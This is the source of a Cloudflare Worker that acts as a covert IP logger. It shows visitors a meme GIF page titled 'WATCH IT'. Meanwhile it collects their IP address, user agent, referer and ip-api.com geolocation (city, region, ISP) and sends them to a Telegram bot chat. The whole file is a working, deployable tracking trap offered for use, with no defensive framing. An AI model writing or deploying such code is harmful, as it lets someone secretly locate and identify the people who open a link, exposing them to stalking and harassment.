// /cloudflare worker/TELEGRAM/worker-env.js

export default {
    async fetch(request, env, ctx) {
        const BOT_TOKEN = env.BOT_TOKEN;
        const CHAT_ID = env.CHAT_ID;
        const GIF_URL = env.GIF_URL || "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";

        if (!BOT_TOKEN || !CHAT_ID) {
            return new Response("ERROR: BOT_TOKEN or CHAT_ID not set!", { status: 500 });
        }

        const ip = request.headers.get("cf-connecting-ip") || "Unknown";
        const userAgent = request.headers.get("user-agent") || "None";
        const referer = request.headers.get("referer") || "None";
        const country = request.headers.get("cf-ipcountry") || "None";

        let geoData = { city: "?", regionName: "?", country: country, isp: "?" };

        try {
            const gRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,query`);
            const geo = await gRes.json();
            if (geo.status === "success") {
                geoData = geo;
            }
        } catch (e) { }

        const message = `🔍 *New Log*
        
*IP:* \`${ip}\`
*Location:* ${geoData.city}, ${geoData.regionName}, ${geoData.country}
*ISP:* ${geoData.isp || "Unknown"}
*User-Agent:* \`${userAgent}\`
*Referer:* ${referer}

📅 ${new Date().toISOString()}`;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };

        ctx.waitUntil(
            fetch(telegramUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
        );

        return new Response(`
      <!DOCTYPE html>
      <html>
        <head><title>WATCH IT</title><meta name="viewport" content="width=device-width, initial-scale=1.0"/></head>
        <body style="margin:0;background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
          <img src="${GIF_URL}" style="max-width:100%;height:auto;" />
        </body>
      </html>
    `, {
            headers: { "Content-Type": "text/html" }
        });
    }
};
